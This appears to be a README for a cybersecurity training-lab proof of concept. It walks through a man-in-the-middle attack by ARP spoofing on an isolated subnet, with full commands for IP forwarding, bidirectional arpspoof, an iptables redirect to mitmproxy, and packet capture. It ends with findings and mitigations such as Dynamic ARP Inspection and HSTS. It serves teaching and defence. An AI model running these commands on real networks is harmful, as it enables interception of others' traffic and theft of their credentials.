# MITM Lab — Man-in-the-Middle Attack via ARP Spoofing

[![NTI Training Lab](https://img.shields.io/badge/Context-NTI_Cybersecurity_Training_Lab-blueviolet.svg)](#context--overview)
[![Security-Research](https://img.shields.io/badge/Role-Solo_Security_Researcher-blue.svg)](https://github.com/momr09989-code/NTI-MITM-Lab)
[![OS-Kali Linux](https://img.shields.io/badge/OS-Kali_Linux-557C94?logo=kalilinux&logoColor=white)](https://www.kali.org/)
[![Tool-Wireshark](https://img.shields.io/badge/Tool-Wireshark-1679A7?logo=wireshark&logoColor=white)](https://www.wireshark.org/)
[![Tool-mitmproxy](https://img.shields.io/badge/Tool-mitmproxy-black?logo=python&logoColor=white)](https://mitmproxy.org/)
[![License-MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

> **Notebook-Style Proof-of-Concept (PoC) Documentation**  
> **Course / Program:** NTI Cybersecurity Training Lab  
> **Role:** Solo Security Researcher (Executed the full attack simulation independently)  
> **Domain:** Layer 2 Insecurity, Address Resolution Protocol (ARP), Traffic Interception, and Packet Forensics

---

## ⚠️ Educational Disclaimer

> [!CAUTION]
> **Strictly for Authorized Educational & Defensive Purposes**  
> This Proof of Concept (PoC) and all accompanying scripts are provided exclusively for academic and training purposes within isolated sandbox lab environments. Executing ARP cache poisoning, packet sniffing, or traffic interception on networks without explicit, documented authorization from the network owner constitutes an offense under computer crime legislation. The author accepts no responsibility for unauthorized application or misuse.

---

## 🎯 Scenario & Objective

In switched Ethernet local area networks (LANs), devices rely on the **Address Resolution Protocol (ARP)** to translate IP addresses (Layer 3) into physical MAC addresses (Layer 2). Because ARP is stateless and lacks authentication mechanisms, nodes implicitly accept gratuitous, unverified ARP replies and update their local cache tables accordingly.

### Primary Objectives:
1. **Simulate a Full Man-in-the-Middle (MITM) Position:** Successfully manipulate the ARP tables of both the target host and the default gateway using bidirectional ARP spoofing.
2. **Ensure Transparent Traffic Forwarding:** Prevent Denial of Service (DoS) by configuring the Linux kernel for seamless IP routing.
3. **Capture and Analyze Intercepted Traffic:** Intercept unencrypted HTTP requests, credentials, and DNS queries using `mitmproxy`, `tshark`, and `Wireshark`.
4. **Formulate Defensive Countermeasures:** Identify enterprise-grade network security controls (e.g., Dynamic ARP Inspection, DHCP Snooping, 802.1X) to mitigate Layer 2 exploitation.

---

## 🏛️ Lab Architecture

The lab is hosted within an isolated virtual network segment (`192.168.1.0/24`) consisting of three distinct nodes:

```
                      +-----------------------------------------+
                      |             Default Gateway             |
                      |          IP: 192.168.1.1                |
                      |          MAC: 00:50:56:EA:01:01         |
                      +--------------------+--------------------+
                                           |
                              Legitimate   | Poisoned ARP:
                              Packets      | "192.168.1.100 is at Attacker MAC"
                                           v
                      +-----------------------------------------+
                      |         Attacker Workstation            |
                      |            (Kali Linux)                 |
                      |          IP: 192.168.1.50               |
                      |          MAC: 00:0C:29:AA:BB:CC         |
                      |   [IP Forwarding + mitmproxy Intercept] |
                      +--------------------+--------------------+
                                           ^
                              Poisoned ARP:| Legitimate
                              "192.168.1.1 | Packets
                              is Attacker" |
                                           |
                      +--------------------+--------------------+
                      |            Target Client                |
                      |         (Victim Workstation)            |
                      |          IP: 192.168.1.100              |
                      |          MAC: 00:50:56:FB:02:02         |
                      +-----------------------------------------+
```

### Lab Nodes Matrix

| Role | Hostname / OS | IP Address | MAC Address | Function |
| :--- | :--- | :--- | :--- | :--- |
| **Gateway** | Router / Linux Gateway | `192.168.1.1` | `00:50:56:EA:01:01` | Default gateway routing traffic outside the LAN |
| **Attacker** | Kali Linux 2024.x | `192.168.1.50` | `00:0C:29:AA:BB:CC` | Execution host for ARP spoofing and interception tools |
| **Victim** | Client Workstation | `192.168.1.100` | `00:50:56:FB:02:02` | Test victim client generating web and network traffic |

---

## 🚀 Execution Steps & Scripts Reference

The lab workflow is modularized into dedicated execution scripts and reference guides located in this repository:

| Step | Script / Reference File | Description |
| :---: | :--- | :--- |
| **1** | [`01_setup_ip_forwarding.sh`](01_setup_ip_forwarding.sh) | Validates and activates IPv4 packet forwarding in the Linux kernel. |
| **2** | [`02_arp_spoof_attack.sh`](02_arp_spoof_attack.sh) | Initiates automated bidirectional ARP poisoning between victim and gateway. |
| **3** | [`03_traffic_interception_commands.txt`](03_traffic_interception_commands.txt) | Reference commands for `iptables` NAT redirection, `mitmproxy`, `Wireshark`, and `tshark`. |

---

### Step 1: Kernel IP Forwarding Configuration

Run [`01_setup_ip_forwarding.sh`](01_setup_ip_forwarding.sh) to ensure packets reaching the attacker are forwarded toward their intended destination rather than dropped.

```bash
# Make script executable and execute as root
chmod +x 01_setup_ip_forwarding.sh
sudo ./01_setup_ip_forwarding.sh
```

*Mechanism:* Modifies `/proc/sys/net/ipv4/ip_forward` and `sysctl net.ipv4.ip_forward=1`. Without this, incoming traffic addressed to the gateway or victim is discarded, inadvertently causing a Denial of Service.

---

### Step 2: Bidirectional ARP Cache Poisoning

Execute [`02_arp_spoof_attack.sh`](02_arp_spoof_attack.sh) to launch parallel `arpspoof` processes targeting both the victim host and the gateway router.

```bash
# Make script executable and run with target arguments
chmod +x 02_arp_spoof_attack.sh
sudo ./02_arp_spoof_attack.sh eth0 192.168.1.100 192.168.1.1
```

*Verification on Victim:*
```bash
arp -a
# Observed: 192.168.1.1 now resolves to 00:0C:29:AA:BB:CC (Attacker's MAC)
```

---

### Step 3: Traffic Interception & Packet Sniffing

Refer to [`03_traffic_interception_commands.txt`](03_traffic_interception_commands.txt) to redirect traffic and launch analysis utilities:

```bash
# 1. Redirect HTTP traffic to transparent proxy port
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080

# 2. Launch interactive transparent proxy
mitmproxy --mode transparent --listen-port 8080 --showhost

# 3. Concurrently inspect live packets with Wireshark
sudo wireshark -i eth0 -k &
```

---

## 📈 Analysis & Results

| Observation Vector | Finding / Impact | Risk Classification |
| :--- | :--- | :---: |
| **ARP Cache State** | Victim updated its local ARP cache without prior solicitations (Gratuitous ARP acceptance). | **High** |
| **Session Flow** | Full TCP handshakes and round-trip communications succeeded with sub-millisecond overhead. | **High** |
| **Cleartext Transmission** | HTTP GET/POST queries, cookies, and unencrypted credentials were reconstructed in plaintext via `mitmproxy` and `Wireshark`. | **Critical** |
| **DNS Visibility** | All DNS queries emitted by the client were intercepted, revealing full domain browsing history. | **Medium** |

---

## 🛡️ Mitigation & Defense

To mitigate ARP spoofing and Man-in-the-Middle exposure across modern enterprise architectures:

1. **Dynamic ARP Inspection (DAI):**
   - Deploy DAI on managed Layer 2 switches.
   - Requires **DHCP Snooping** to build a trusted binding database (MAC-to-IP-to-Switch-Port). Invalid or forged ARP responses are dropped at the switch port.
2. **Static ARP Entries:**
   - On static, high-value infrastructure (e.g., default gateways, core domain controllers), configure immutable static ARP table mappings.
3. **Network Access Control (NAC / 802.1X):**
   - Enforce IEEE 802.1X port-based authentication to prevent unauthorized attacker devices from attaching to the physical LAN.
4. **End-to-End Transport Layer Encryption:**
   - Enforce HTTPS with **HSTS (HTTP Strict Transport Security)** preloading.
   - Utilize authenticated VPN tunnels (WireGuard, IPsec) or zero-trust network access (ZTNA) to protect payloads even if Layer 2 is compromised.

---

## 🏁 Conclusion

As demonstrated in this **NTI Cybersecurity Training Lab**, unauthenticated Layer 2 protocols pose severe risks if left unguarded on enterprise subnets. Executed by a **Solo Security Researcher**, this simulation highlights the necessity of combining switch-level Layer 2 defenses (DAI, DHCP Snooping) with mandatory end-to-end transport layer encryption.
